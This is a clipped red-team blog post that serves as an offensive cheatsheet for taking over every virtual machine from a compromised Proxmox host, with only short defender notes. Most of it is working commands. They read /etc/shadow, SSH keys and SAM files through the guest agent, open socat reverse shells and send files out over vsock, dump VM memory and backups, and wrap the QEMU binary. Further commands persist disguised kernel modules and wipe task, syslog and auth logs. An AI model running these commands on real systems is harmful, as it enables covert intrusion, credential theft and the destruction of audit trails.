---
title: Living off the Hypervisor - LOLPROX
source: https://blog.zsec.uk/lolprox/
source_host: blog.zsec.uk
clip_date: 2026-09-15T10:17:42+08:00
trace_id: 6214334d-6f57-41f4-99a4-1bffcda8975d
content_hash: 2001d95794c4e21cbf84ca9de6fa54014f8dcc6266530fc4db1563898c086754
status: synced
tags:
  - Linux安全
  - 内核
series: null
feed_source: zsec·逆向安全
ai_summary: Proxmox 本质是完整 Debian，一旦拿下宿主机，就能借 guest agent、vsock、快照与 I/O 拦截控制其全部虚拟机，且几乎不产生网络痕迹。
ai_summary_style: key-points
images_status:
  total: 4
  succeeded: 4
  failed_urls: []
notion_page_id: 3dc75244-d011-81a5-a839-d7ebff8d9e46
ioc: null
---

> 💡 **AI 总结（key-points）**
>
> Proxmox 本质是完整 Debian，一旦拿下宿主机，就能借 guest agent、vsock、快照与 I/O 拦截控制其全部虚拟机，且几乎不产生网络痕迹。
> 
> - **攻击面定位：** `/etc/pve` 是跨节点复制的 FUSE 文件系统，`user.cfg`、`priv/token.cfg`、`acl.cfg` 直接暴露集群全部身份、API 令牌与权限。
> - **无网络执行：** VM 配置含 `agent: 1` 时，`qm guest exec`/`file-read`/`file-write` 可读写来宾并以 root 或 SYSTEM 执行命令，流量不走网络；痕迹主要在 `/var/log/pve/tasks/`。
> - **vsock 隐蔽信道：** AF_VSOCK 经 virtio 通道绕过两侧网络栈，防火墙、tcpdump、Zeek、Suricata 与来宾 `ss` 均不可见；宿主机固定 CID 2，用 socat 可做正反向 shell 与数据外传。
> - **数据获取：** `--vmstate` 快照等同内存转储；`vzdump` 加 `vma extract` 可离线挂载整块磁盘读取 `/etc/shadow`；device-mapper、QEMU `blkdebug`、eBPF 可拦截或篡改全部块 I/O。
> - **持久化与清理：** 恶意内核模块经 `modules-load.d`、systemd 服务或 rc.local 加载，可自我隐藏；Proxmox 通常未启用安全启动，防御重点是核对 QEMU 二进制、模块与 eBPF 程序。

![Living off the Hypervisor - LOLPROX](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/9450e7bcd7f525a7.jpg)

[Proxmox](https://proxmox.com/en/?ref=blog.zsec.uk) is at its core just a Debian image with some hypervisor tooling on top but there's a lot that can be done around using the tooling for nefarious purposes. There are many living off the land GitHub pages out there for everything from general Windows binaries ([LOLBAS](https://lolbas-project.github.io/?ref=blog.zsec.uk)) through to specialist hypervisor commands like [LOLESXi](https://lolesxi-project.github.io/LOLESXi/?ref=blog.zsec.uk).

I have written in the past about how to deploy a home lab using Proxmox which you can read [about here](https://blog.zsec.uk/homelab-clustering-pt1/) but the focus of this blog is going to be a cheatsheet for enumeration of a proxmox cluster but also show some of the lesser known tools and how they can be useful in a red team setting.

What makes Proxmox unique and interesting from an offensive perspective is the convergence of two worlds. It combines standard Linux privilege escalation and persistence techniques with hypervisor-specific capabilities that most defenders aren't monitoring. When you compromise a Proxmox host, it unlocks potentially owning every VM it manages, and doing so in ways that traditional endpoint detection can't currently see.

## Attention: Blue Team!

If you're a defender you'll probably want to better understand how to defend against this blog post, to save writing a small novel I split this into two posts, here's the defence one:

If you want just the techniques and can't be bothered reading this post, check out Living Off The Land - Proxmox (LOLPROX):

## Basic System Details

Before we get down to the nitty gritty details and going through the paces of offensive techniques, it's worth understanding what you're dealing with when you land on a Proxmox host. Unlike ESXi, which runs a proprietary microkernel, Proxmox runs a full Debian Linux distribution. This means all your standard Linux enumeration and privilege escalation techniques apply, but you also get access to a rich set of virtualisation-specific tools which give you broader access to underlying hosts on said hypervisor.

The key components you'll interact with are:

-   **`pve-cluster`**: The cluster filesystem that synchronises configuration across nodes
-   **`pve-qemu-kvm`**: The QEMU/KVM hypervisor that actually runs your VMs
-   **`pve-container`**: LXC container management
-   **`pve-storage`**: Storage management across local, networked, and distributed backends
-   **`corosync`**: Cluster communication and quorum
-   `**pmxcfs**`: The Proxmox cluster filesystem mounted at `/etc/pve`

The `/etc/pve` directory is particularly interesting in that it is a FUSE filesystem that's replicated across all cluster nodes. Any configuration you read or write here is immediately visible to all nodes in the cluster.

Some basic commands to get started are detailed:

```bash
# Basic version and node info
pveversion -v
hostname
cat /etc/pve/storage.cfg
cat /etc/pve/.members

# What cluster am I part of?
pvecm status
cat /etc/pve/corosync.conf

# Quick hardware overview
lscpu
free -h
lsblk
```

## Host Reconnaissance & Enumeration

Once you've established that you're on a Proxmox host, your first priority is understanding the scope of what you can reach and what types of host are available. A single Proxmox node might manage dozens of VMs, and a cluster might span multiple physical hosts with shared storage.

### Cluster Architecture Discovery

Understanding whether you're on a standalone node or part of a cluster fundamentally changes your attack surface. Clustered environments mean your access potentially extends to multiple physical hosts, and the cluster filesystem means configuration changes propagate automatically.

```bash
# Am I in a cluster?
pvecm status
pvecm nodes

# Cluster node details
cat /etc/pve/nodes/*/qemu-server/*.conf 2>/dev/null | head -50

# What nodes exist and their IPs?
cat /etc/pve/corosync.conf | grep -A2 "nodelist"
awk '/ring0_addr/ {print $2}' /etc/pve/corosync.conf
```

If the host isn't part of a cluster you'll get an error like so:

![Living off the Hypervisor - LOLPROX](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/19f5d9a137e18d6e.png)

Living off the Hypervisor - LOLPROX

### VM and Container Discovery

Every VM and container represents a potential pivot target. More importantly, if the QEMU guest agent is enabled on any VM, you can execute commands inside it directly from the host without any network connectivity.

```bash
# List all VMs across the cluster
qm list
pvesh get /cluster/resources --type vm

# List all containers
pct list
pvesh get /cluster/resources --type container

# Detailed VM configuration (look for agent=1, which enables guest agent)
for vmid in $(qm list | awk 'NR>1 {print $1}'); do
    echo "=== VM $vmid ==="
    qm config $vmid | grep -E "(name|agent|net|memory|cores)"
done

# Find VMs with guest agent enabled (your execution targets)
grep -l "agent.*1" /etc/pve/qemu-server/*.conf
```

![Living off the Hypervisor - LOLPROX](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/9ed19db79196af03.png)

List of VMs in one of my home labs

![Living off the Hypervisor - LOLPROX](https://blog.zsec.uk/content/images/2025/12/image-5.png)

Resources List on Homelab

### Storage Enumeration

Storage backends tell you where VM disks live and what exfiltration paths might exist (also if you're emulating ransomware, what is available to encrypt). Proxmox supports local storage (LVM, ZFS, directory), networked storage (NFS, iSCSI, Ceph), and various backup locations.

```bash
# Storage overview
pvesm status
cat /etc/pve/storage.cfg

# Where do VM disks actually live?
lvs 2>/dev/null
zfs list 2>/dev/null
ls -la /var/lib/vz/images/

# Backup locations (potential data goldmine)
ls -la /var/lib/vz/dump/
pvesm list local --content backup
```

One of the smaller nodes in my stack:

![Living off the Hypervisor - LOLPROX](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/3cc80047a518d197.png)

Living off the Hypervisor - LOLPROX

### User and Permission Enumeration

Proxmox has its own authentication and permission system layered on top of Linux. Understanding who has access and what tokens might exist helps with persistence and lateral movement.

```bash
# Proxmox users and their realms
cat /etc/pve/user.cfg
pvesh get /access/users

# API tokens (these are persistent credentials)
cat /etc/pve/priv/token.cfg 2>/dev/null
ls -la /etc/pve/priv/

# ACLs - who can do what?
cat /etc/pve/priv/acl.cfg 2>/dev/null

# Two-factor auth configuration
cat /etc/pve/priv/tfa.cfg 2>/dev/null
```

## vsock (AF_VSOCK) Operations

vsock is probably one of the most under appreciated tools in a Proxmox operator's arsenal. It is also a protocol I hadn't encountered until recently, it really is an untapped resource across all hypervisor environments. It provides a socket interface between the hypervisor and guests that completely bypasses the network stack. No IPs, no firewall rules, no network-based detection just a direct `virtio` channel between host and guest.

> No IPs, no firewall rules, no network-based detection

Let that sink in, it is an avenue that can be used to reach into VMs that are otherwise network isolated 👀.

### Why vsock Matters

Traditional post-exploitation on a hypervisor involves either network-based pivoting (SSH, RDP, etc.) or using the guest agent. Both leave traces: network connections show up in netflow logs, firewall rules need to permit them, and EDR products monitor for lateral movement patterns depending on where they're deployed.

However, vsock sidesteps all of this. The communication happens through a virtual PCI device that presents as a character device inside the guest. To network monitoring tools, this traffic simply doesn't exist. It never touches the network stack on either side and thus the only way to see it is if you're monitoring for it. You can be as loud as you want if nobody is listening or watching...

The trade-off is that vsock requires:

1.  The feature to be enabled on the VM (not default for most builds)
2.  Kernel module support on both host and guest
3.  Software on both ends to use the vsock socket

### Checking and Enabling vsock

```bash
# On Proxmox host - check kernel support
lsmod | grep vsock
modprobe vhost_vsock
ls -la /dev/vhost-vsock

# Check which VMs have vsock enabled
grep -r "args.*vsock" /etc/pve/qemu-server/

# Enable vsock on a VM (assigns CID 100)
qm set <vmid> --args '-device vhost-vsock-pci,guest-cid=100'

# Or edit config directly
echo "args: -device vhost-vsock-pci,guest-cid=100" >> /etc/pve/qemu-server/<vmid>.conf

# Restart VM to apply
qm stop <vmid> && qm start <vmid>
```

### Guest-Side Setup

Inside a Linux guest, you need the vsock transport module loaded:

```bash
# Load the module
modprobe vmw_vsock_virtio_transport

# Verify the device exists
ls -la /dev/vsock

# Make it persistent
echo "vmw_vsock_virtio_transport" >> /etc/modules-load.d/vsock.conf

# Check your CID (assigned by host)
cat /sys/class/vsock/vsock0/local_cid
```

Windows doesn't have native vsock support for KVM/QEMU, as such you need to install the `virtio-vsock` driver:

```bash
# Download virtio-win ISO (contains all virtio drivers including vsock)
# https://fedorapeople.org/groups/virt/virtio-win/direct-downloads/

# After mounting the ISO, install the vsock driver
pnputil /add-driver D:\viofs\w10\amd64\*.inf /install

# Or via Device Manager - look for "VirtIO Socket Device" under System devices

# Check that it's loaded on the VM Guest:
# Look for the vsock device
Get-PnpDevice | Where-Object { $_.FriendlyName -like "*vsock*" -or $_.FriendlyName -like "*VirtIO*Socket*" }

# Check driver status
driverquery /v | findstr -i vsock
```

Here's the catch, however, even with the driver installed, Windows doesn't have native userland tools for vsock like Linux does. No `socat` equivalent that speaks `AF_VSOCK` out of the box.

You don't have many options when it comes to supporting it:

1.  **Compile your own tooling** - Write a small C#/C++/Go/Rust program using the socket API
2.  **Use existing projects** - I only found a few that existed but they're not actively supported or widely tested
3.  **Deploy a vsock-aware implant** - If you're already deploying something, add vsock support to add extra fun

Practical Alternative: Named Pipe over virtio-serial

If the above options sound too painful on Windows, `virtio-serial` with named pipes is better supported:

On Proxmox host - add serial port to VM:

```
qm set <vmid> --serial0 socket
# Or in config:
# serial0: socket
```

This creates a socket at:

```bash
/var/run/qemu-server/<vmid>.serial0
```

Connect from host:

```bash
socat - UNIX-CONNECT:/var/run/qemu-server/<vmid>.serial0
```

**On Windows guest, it appears as a COM port** - which is much easier to interact with using standard Windows tools or PowerShell.

### Communication Patterns

The host is always CID 2. Guests are assigned CIDs when you configure vsock (typically starting at 3).

Host connecting to guest listener:

```bash
# Guest runs a listener
socat VSOCK-LISTEN:4444,fork EXEC:/bin/bash,pty,stderr,setsid,sigint,sane

# Host connects
socat - VSOCK-CONNECT:100:4444
```

**Guest reverse shell to host:**

```bash
# Host listener
socat VSOCK-LISTEN:5555,fork -

# Guest calls back
socat EXEC:'/bin/bash -li',pty,stderr,setsid,sigint,sane VSOCK-CONNECT:2:5555
```

**Data exfiltration via vsock:**

```bash
# Host receiver
socat VSOCK-LISTEN:6666 - > exfil.tar.gz

# Guest sends data
tar czf - /etc /home 2>/dev/null | socat - VSOCK-CONNECT:2:6666
```

### vsock OPSEC Considerations

While it's got all these benefits of being network silent, there are key considerations to understand from operational security angle, here are the things that make vsock communications visible:

-   Process listing shows `socat` or your custom binary (so if you go this route, name it something benign to blend in!)
-   `lsof` on the host may reveal vsock file descriptors
-   `/proc/<pid>/fd` will show vsock sockets

What remains invisible:

-   No network traffic (tcpdump, Zeek, Suricata won't see it)
-   No IP addresses or ports in traditional sense
-   No firewall logs
-   Guest-side `ss` and `netstat` won't show the connection

## QEMU Guest Agent Abuse (qm)

The QEMU guest agent is your primary malwareless execution path in Proxmox. When a VM has the guest agent installed and enabled (`agent: 1` in the VM config), the hypervisor can execute commands, read files, and write files inside the guest all through the virtio channel, not the network.

### Why Guest Agent Access is Devastating

From a defender's perspective, guest agent commands are nearly invisible. There's no network connection, no login event, no process spawning from SSH or RDP. Commands execute as the QEMU guest agent service (typically running as `SYSTEM` on Windows or `root` on Linux).

From an attacker's perspective, this is arbitrary code execution on every VM with the agent enabled, using only tools that ship with Proxmox.

### Finding Targets

```bash
# Find VMs with guest agent enabled
for vmid in $(qm list | awk 'NR>1 {print $1}'); do
    if qm config $vmid | grep -q "agent.*1"; then
        echo "VM $vmid has guest agent enabled"
        qm agent $vmid ping 2>/dev/null && echo "  -> Agent responding"
    fi
done

# Quick agent health check
qm agent <vmid> ping
qm agent <vmid> info
qm guest cmd <vmid> get-osinfo
```

### Command Execution

```bash
# *nix targets
qm guest exec <vmid> -- /bin/bash -c "id && hostname && cat /etc/passwd"
qm guest exec <vmid> -- /usr/bin/python3 -c "import socket; print(socket.gethostname())"

# Windows targets
qm guest exec <vmid> -- cmd.exe /c "whoami /all && ipconfig /all"
qm guest exec <vmid> -- powershell.exe -c "Get-Process; Get-NetTCPConnection"

# Capture output as JSON (useful for parsing)
qm guest exec <vmid> --output-format=json -- bash -c "cat /etc/shadow"

# Long-running commands
qm guest exec <vmid> --timeout 300 -- bash -c "find / -name '*.pem' 2>/dev/null"
```

### File Operations

```bash
# Read sensitive files - Linux
qm guest file-read <vmid> /etc/shadow
qm guest file-read <vmid> /root/.ssh/id_rsa
qm guest file-read <vmid> /root/.bash_history
qm guest file-read <vmid> /home/<user>/.aws/credentials

# Read sensitive files - Windows
qm guest file-read <vmid> "C:\\Windows\\System32\\config\\SAM"
qm guest file-read <vmid> "C:\\Users\\Administrator\\Desktop\\passwords.txt"
qm guest file-read <vmid> "C:\\Windows\\Panther\\unattend.xml"

# Write files (deploy tooling, configs, etc.)
qm guest file-write <vmid> /tmp/payload.sh '#!/bin/bash\nid > /tmp/pwned'
qm guest exec <vmid> -- chmod +x /tmp/payload.sh
qm guest exec <vmid> -- /tmp/payload.sh
```

### Mass Enumeration Across VMs

```bash
# Enumerate all VMs with responding agents
for vmid in $(qm list | awk 'NR>1 {print $1}'); do
    if qm agent $vmid ping 2>/dev/null; then
        echo "=== VM $vmid ==="
        qm guest exec $vmid -- bash -c "hostname; id; cat /etc/passwd | grep -v nologin" 2>/dev/null
    fi
done
```

### Guest Agent OPSEC

So there are some key IoCs and considerations when using guest agent execution such as:

-   On Proxmox host: Task logs in `/var/log/pve/tasks/ on the hypervisor`
-   `journalctl` may show `qm` operations
-   Inside guest: `qemu-guest-agent` service logs

What you can do about it:

-   Task logs can be cleared: `rm /var/log/pve/tasks/*`
-   Commands blend with legitimate VM automation, have a look at the bash history and see if `qm` is used regularly with `ctrl+r` in your terminal and look for `qm`
-   Similar to VSOCK there's no network coms logged when used

## Snapshot & Backup Abuse

Proxmox's snapshot and backup capabilities are designed for disaster recovery and migration, but they provide powerful opportunities for both data extraction and manipulation.

### Snapshots for Memory Acquisition

When you create a snapshot with `--vmstate`, you capture the VM's memory state. This is effectively a memory dump that can be analysed offline for credentials, encryption keys, and other sensitive data.

```bash
# List existing snapshots
qm listsnapshot <vmid>

# Create snapshot including memory state
qm snapshot <vmid> forensic-snap --vmstate --description "maintenance"

# Memory state is saved alongside the snapshot
ls -la /var/lib/vz/images/<vmid>/

# Extract and analyse with volatility or strings
strings /var/lib/vz/images/<vmid>/vm-<vmid>-state-*.raw | grep -i password
```

### Backup Extraction and Analysis

Backups contain complete copies of VM disks. If you have access to the Proxmox host, you have access to every backup it's created.

```bash
# Grab and locate all backups
ls -la /var/lib/vz/dump/
pvesm list local --content backup

# Create a backup of a target VM
vzdump <vmid> --storage local --mode snapshot --compress zstd

# Extract a VMA backup (Proxmox's native format)
vma extract vzdump-qemu-<vmid>-*.vma /tmp/extracted/

# Mount the extracted disk
losetup -fP /tmp/extracted/disk-drive-scsi0.raw
mount /dev/loop0p1 /mnt/extracted

# Now you have offline access to the entire filesystem
cat /mnt/extracted/etc/shadow
ls -la /mnt/extracted/home/
```

### Live Disk Access Without Backup

For LVM-backed VMs, you can potentially mount the disk directly (use with caution as this can corrupt a running VM):

```bash
# Find the VM's logical volume
lvs | grep vm-<vmid>

# For a stopped VM, mount directly
mount /dev/pve/vm-<vmid>-disk-0 /mnt/target

# For ZFS-backed VMs
zfs list | grep vm-<vmid>
# Mount the zvol or clone it first
```

## Device-Mapper Based I/O Interception

This is where we start getting into ESXi VAIO-equivalent territory. Device-mapper is a Linux kernel framework that lets you insert arbitrary block device layers. In the context of Proxmox, this means you can position yourself between a VM's disk and the underlying storage, intercepting every read and write.

### Understanding the Attack Surface

Proxmox typically uses LVM for VM storage, with logical volumes like `/dev/pve/vm-100-disk-0`. QEMU opens these block devices directly. If you can insert a device-mapper layer, you can observe, modify, or redirect all I/O.

This enables:

-   **Transparent data exfiltration**: Copy all writes to a secondary location
-   **Ransomware at hypervisor level**: Encrypt data as it's written, VM has no visibility - something for defenders to watch out for!
-   **Selective data manipulation**: Modify specific files as they're accessed
-   **Credential harvesting**: Watch for configuration files, database dumps, etc.

### Reconnaissance

```bash
# Check current VM disk setup
lvs
ls -la /dev/pve/

# VM disks typically live here
ls -la /dev/pve/vm-*-disk-*

# See what device-mapper targets already exist
dmsetup ls
dmsetup table

# Check if any VMs are using device-mapper
lsblk -o NAME,TYPE,SIZE,MOUNTPOINT | grep dm
```

### Conceptual Malicious DM Target

The following is a conceptual kernel module that creates a device-mapper target for intercepting VM I/O. This would require compiling against the running kernel headers:

```c
// Kernel module that creates a device-mapper target
// intercepting reads/writes to VM disks

#include <linux/device-mapper.h>

static int malicious_map(struct dm_target *ti, struct bio *bio)
{
    // Intercept write operations
    if (bio_data_dir(bio) == WRITE) {
        // Access bio data
        struct bio_vec bvec;
        struct bvec_iter iter;
        
        bio_for_each_segment(bvec, bio, iter) {
            void *data = kmap(bvec.bv_page) + bvec.bv_offset;
            
            // Exfiltrate, encrypt, modify...
            // send_to_userspace(data, bvec.bv_len);
            
            kunmap(bvec.bv_page);
        }
    }
    
    // Pass through to underlying device
    bio_set_dev(bio, ti->private);
    submit_bio(bio);
    
    return DM_MAPIO_SUBMITTED;
}

static struct target_type malicious_target = {
    .name   = "pve-cache",  // Innocuous name
    .module = THIS_MODULE,
    .map    = malicious_map,
    // ...
};
```

## QEMU Block Filter Injection

QEMU has its own block layer with support for filters and debugging hooks. You can inject these via VM configuration or by wrapping the QEMU binary.

### Via Proxmox VM Configuration

The `--args` parameter in VM config lets you pass arbitrary QEMU arguments:

```bash
# Add custom QEMU args to a VM
qm set <vmid> --args '-blockdev driver=blkdebug,config=/tmp/intercept.conf,node-name=intercept0'

# The config file can specify various debugging/interception rules
cat > /tmp/intercept.conf << 'EOF'
[inject-error]
event = "read_aio"
errno = "5"
once = "off"
EOF
```

### QEMU Binary Wrapper

A more invasive but flexible approach is replacing the QEMU binary with a wrapper:

```bash
# Replace QEMU with wrapper
mv /usr/bin/qemu-system-x86_64 /usr/bin/qemu-system-x86_64.real

cat > /usr/bin/qemu-system-x86_64 << 'EOF'
#!/bin/bash

# Log all QEMU invocations (VM starts, configs, etc.)
echo "$(date): $@" >> /var/log/.qemu-audit.log

# Extract VM ID from arguments for targeted attacks
VMID=$(echo "$@" | grep -oP '(?<=-id )\d+')

# Could inject additional monitoring/interception here
# Could modify block device arguments
# Could add QMP socket for runtime manipulation

# Pass through to real QEMU
exec /usr/bin/qemu-system-x86_64.real "$@"
EOF

chmod +x /usr/bin/qemu-system-x86_64
```

This wrapper survives VM restarts and captures every VM start, giving you visibility into the entire virtualisation environment.

## eBPF-Based I/O Interception

eBPF (Extended Berkeley Packet Filter) is the stealthiest option for I/O interception. It lets you attach programs to kernel tracepoints without loading a custom kernel module. The programs run in a sandboxed VM inside the kernel.

### Why eBPF is Attractive

-   No kernel module compilation required
-   Harder to detect than loaded modules
-   Can attach to dozens of different hook points
-   Programs are JIT-compiled for performance
-   Legitimate use is common (performance monitoring, security tools)

### Basic Block Layer Tracing

```bash
# Quick one-liner to observe all block I/O from QEMU processes
bpftrace -e 'tracepoint:block:block_rq_issue /comm == "qemu-system-x86"/ { 
    printf("%s: %d bytes to dev %d:%d\n", comm, args->bytes, args->dev >> 20, args->dev & 0xfffff); 
}'

# More detailed - capture which VMs are doing I/O
bpftrace -e '
tracepoint:block:block_rq_issue /comm == "qemu-system-x86"/ {
    printf("[%s] %s %s %d bytes @ sector %lld\n", 
        strftime("%H:%M:%S", nsecs),
        comm,
        args->rwbs,
        args->bytes,
        args->sector);
}'
```

### Compiled eBPF Program

For more sophisticated interception, compile a proper eBPF program:

```c
// io_intercept.bpf.c
#include <linux/bpf.h>
#include <bpf/bpf_helpers.h>
#include <bpf/bpf_tracing.h>

struct {
    __uint(type, BPF_MAP_TYPE_PERF_EVENT_ARRAY);
    __uint(key_size, sizeof(int));
    __uint(value_size, sizeof(int));
} events SEC(".maps");

struct io_event {
    u32 pid;
    u64 sector;
    u32 bytes;
    char comm[16];
};

SEC("tp_btf/block_rq_issue")
int BPF_PROG(trace_block_rq_issue, struct request *rq)
{
    struct io_event event = {};
    
    event.pid = bpf_get_current_pid_tgid() >> 32;
    bpf_get_current_comm(&event.comm, sizeof(event.comm));
    
    // Filter for QEMU processes
    if (event.comm[0] == 'q' && event.comm[1] == 'e') {
        bpf_perf_event_output(ctx, &events, BPF_F_CURRENT_CPU, 
                              &event, sizeof(event));
    }
    
    return 0;
}

char LICENSE[] SEC("license") = "GPL";
```

Deploy and test it:

```bash
# Compile
clang -O2 -target bpf -c io_intercept.bpf.c -o io_intercept.bpf.o

# Load
bpftool prog load io_intercept.bpf.o /sys/fs/bpf/io_intercept

# Attach to tracepoint
bpftool prog attach pinned /sys/fs/bpf/io_intercept tracepoint block block_rq_issue
```

## Storage Backend Manipulation

Different storage backends have different manipulation opportunities. Proxmox supports multiple backends, and each has unique attack vectors.

### LVM-Backed VMs

LVM is the default for most Proxmox installations:

```bash
# List VM logical volumes
lvs | grep vm-

# Create a snapshot for offline access (non-destructive)
lvcreate -L 10G -s -n snap-vm-100 /dev/pve/vm-100-disk-0

# Mount the snapshot
mount /dev/pve/snap-vm-100 /mnt/snap

# Access files, then clean up
umount /mnt/snap
lvremove /dev/pve/snap-vm-100
```

### ZFS-Backed VMs

ZFS offers powerful snapshotting and cloning:

```bash
# List ZFS datasets for VMs
zfs list | grep vm-

# Check if channel programs are enabled (allows Lua execution in kernel)
zpool get feature@channel_programs rpool

# Create instant snapshot
zfs snapshot rpool/data/vm-100-disk-0@exfil

# Clone for offline access
zfs clone rpool/data/vm-100-disk-0@exfil rpool/data/exfil-copy

# Mount and access
mount -t zfs rpool/data/exfil-copy /mnt/exfil
```

### File-Based Storage (qcow2/raw on NFS or Local)

```bash
# Find VM disk images
find /var/lib/vz/images -name "*.qcow2" -o -name "*.raw"

# Mount qcow2 image (requires qemu-nbd)
modprobe nbd max_part=8
qemu-nbd --connect=/dev/nbd0 /var/lib/vz/images/<vmid>/vm-<vmid>-disk-0.qcow2
mount /dev/nbd0p1 /mnt/qcow

# Don't forget to disconnect
umount /mnt/qcow
qemu-nbd --disconnect /dev/nbd0
```

## Kernel Module Persistence

This is the Proxmox equivalent to vSphere Installation Bundle (VIB) persistence in ESXi. Once you can load kernel modules, you have complete control over the hypervisor.

### Module Loading Basics

```bash
# Check if secure boot is enforced (usually isn't on Proxmox)
mokutil --sb-state
dmesg | grep -i secure

# Current loaded modules
lsmod

# Module signature enforcement
cat /proc/sys/kernel/modules_disabled
cat /sys/module/module/parameters/sig_enforce
```

### Persistence Methods

**Via `modules-load.d` (cleanest):**

```bash
# Assuming you've compiled and installed your module to the standard path
cp malicious.ko /lib/modules/$(uname -r)/kernel/drivers/misc/

# Update module dependencies
depmod -a

# Auto-load on boot
echo "malicious" >> /etc/modules-load.d/pve-extras.conf
```

**Via `systemd` service:**

```bash
cat > /etc/systemd/system/pve-optimise.service << 'EOF'
[Unit]
Description=PVE Performance Optimisation
After=pve-cluster.service
Before=pve-guests.service

[Service]
Type=oneshot
ExecStart=/sbin/insmod /opt/pve/modules/pve-perf.ko
RemainAfterExit=yes

[Install]
WantedBy=multi-user.target
EOF

systemctl daemon-reload
systemctl enable pve-optimise
```

**Via `rc.local` (legacy but works depending on the version of Proxmox):**

```bash
# Ensure rc-local service is enabled
systemctl enable rc-local

cat >> /etc/rc.local << 'EOF'
#!/bin/bash
insmod /opt/modules/backdoor.ko
exit 0
EOF

chmod +x /etc/rc.local
```

### Hiding Loaded Modules

A properly written malicious module can hide itself from `lsmod` by removing itself from the kernel's module list while remaining functional. This is advanced rootkit territory and beyond the scope of this cheatsheet, but be aware that absence from `lsmod` doesn't mean absence from the system.

## Detection Awareness

While understanding all the attacker techniques is useful, equally understanding what gets logged helps you operate more carefully and clean up appropriately. For all the defenders out there who may have not considered the Proxmox attack surface here's some details.

### What Proxmox Logs

| Location | Contents | Risk Level |
| --- | --- | --- |
| `/var/log/pve/tasks/` | All qm, pct, vzdump operations | High |
| `/var/log/syslog` | General system events | Medium |
| `/var/log/auth.log` | Authentication events | High |
| `/var/log/pve/qemu-server/<vmid>.log` | Per-VM QEMU logs | Low |
| `/var/log/pveproxy/access.log` | Web UI/API access | Medium |

### Commands That Leave Traces

-   `qm guest exec` - logged in task system
-   `vzdump` - logged in task system
-   `qm snapshot` - logged in task system
-   `pvesh` API calls - logged in pveproxy

### Commands That Are Quieter

-   `qm guest file-read` - minimal logging
-   Direct file access via mounted disks - no Proxmox logging
-   vsock communication - no logging
-   eBPF programs - no Proxmox logging

Here's a more fuller blog post on detection tips around LOLPROX and things to consider more greatly.

### Cleaning Up

Finally everyone loves a bit of anti-forensics so here's some cleanup commands for people to consider:

```bash
# Clear task logs
rm -rf /var/log/pve/tasks/*

# Truncate logs (less suspicious than deletion)
truncate -s 0 /var/log/syslog
truncate -s 0 /var/log/auth.log

# Edit specific entries (most surgical)
sed -i '/pattern_to_remove/d' /var/log/syslog

# Clear bash history
history -c
rm ~/.bash_history
```

## Key Takeaways

1.  **Guest agent access is devastating** - Any VM with `agent: 1` is fully compromised from the hypervisor if an adversary gets root access to the box
2.  **vsock bypasses all network monitoring** - Use it for C2 when stealth matters, really useful for reaching into 'isolated' VMs.
3.  **Snapshots and backups are goldmines** - Offline analysis with full disk access, great for pulling those NTDS.dits or other useful files
4.  **Multiple I/O interception options** - Device-mapper, QEMU hooks, eBPF depending on your needs
5.  **Standard Linux persistence applies** - But kernel modules give you hypervisor-level control
6.  **Logging is minimal** - Most guest agent and `vsock` activity isn't monitored by default

For defenders: monitor your task logs, validate your QEMU binaries, check for unexpected kernel modules and eBPF programs, and treat hypervisor compromise as total environment compromise.

For operators: you're not just owning one box, you're owning the entire virtualisation stack. Use that access wisely and think ahead with what you hope todo with it.
